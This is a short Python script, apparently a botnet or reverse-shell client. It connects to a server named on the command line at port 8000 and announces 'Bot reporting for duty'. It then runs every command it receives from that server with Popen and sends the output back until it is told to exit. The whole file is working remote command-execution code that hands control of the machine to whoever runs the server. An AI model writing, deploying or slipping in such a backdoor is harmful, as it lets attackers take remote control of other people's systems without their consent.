import sys
from subprocess import Popen, PIPE
from socket import socket, AF_INET, SOCK_STREAM

EXIT_COMMANDS = ('exit', 'quit', 'bye')
command: str | None = None

server_name = sys.argv[1]
server_port = 8000


# create IPv4(AF_INET), TCPSocket(SOCK_STREAM)
client_socket = socket(AF_INET, SOCK_STREAM)
client_socket.connect((server_name, server_port))
client_socket.send('Bot reporting for duty'.encode())


def receive_command():
    global command
    command = client_socket.recv(4096).decode()


while command not in EXIT_COMMANDS:
    receive_command()
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
    result, err = proc.communicate()
    client_socket.send(result)

client_socket.close()
